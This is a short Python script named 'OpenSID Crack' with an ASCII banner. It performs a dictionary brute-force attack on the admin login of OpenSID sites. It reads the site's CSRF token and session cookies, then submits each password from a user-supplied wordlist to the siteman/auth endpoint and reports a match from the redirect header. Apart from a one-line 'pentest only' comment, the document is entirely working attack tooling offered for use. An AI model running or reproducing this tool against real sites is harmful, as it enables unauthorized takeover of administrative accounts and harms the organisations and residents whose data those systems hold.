# OpenSID Crack
# Code by Mugi F.
# github.com/mugi789
# Tujuan saya membuat tools ini hanya untuk keperluan pentest

import requests

print('''
╔═══╗            ╔═══╗╔══╗╔═══╗    ╔═══╗            ╔╗  
║╔═╗║            ║╔═╗║╚╣╠╝╚╗╔╗║    ║╔═╗║            ║║  
║║ ║║╔══╗╔══╗╔═╗ ║╚══╗ ║║  ║║║║    ║║ ╚╝╔═╗╔══╗ ╔══╗║║╔╗
║║ ║║║╔╗║║╔╗║║╔╗╗╚══╗║ ║║  ║║║║    ║║ ╔╗║╔╝╚ ╗║ ║╔═╝║╚╝╝
║╚═╝║║╚╝║║║═╣║║║║║╚═╝║╔╣╠╗╔╝╚╝║    ║╚═╝║║║ ║╚╝╚╗║╚═╗║╔╗╗
╚═══╝║╔═╝╚══╝╚╝╚╝╚═══╝╚══╝╚═══╝    ╚═══╝╚╝ ╚═══╝╚══╝╚╝╚╝
     ║║           (Code by Mugi F.)                                 
     ╚╝                                                 
''')
# 
url = input("Input URL : ").rstrip("/")
username = input("Input Username : ")
password = input("Input Password File : ")
getkuki = requests.get(url).cookies.values()
# 
print("="*30)
try:
    with open(password, "r") as katasandi:
        for sandi in katasandi:
            headers = {
                "Cookie": "sidcsrf="+getkuki[1]+"; ci_session="+getkuki[0]
                }
            data = {
                "username": username,
                "password": sandi.replace("\n", ""),
                "sidcsrf": getkuki[1]
                }
            coba = requests.post(url+"/index.php/siteman/auth", data=data, headers=headers, allow_redirects=False)
            if url+"/index.php/main" == coba.headers["Location"]:
                print(sandi.replace("\n", "")+" Password found ^_^ ")
                break
            elif url+"/main" == coba.headers["Location"]:
                print(sandi.replace("\n", "")+" Password found ^_^ ")
                break
            else:
                print(sandi.replace("\n", ""), end=" "*20+"\r")
except FileNotFoundError:
    print("Password file not found, input the correct file name")
print("="*30)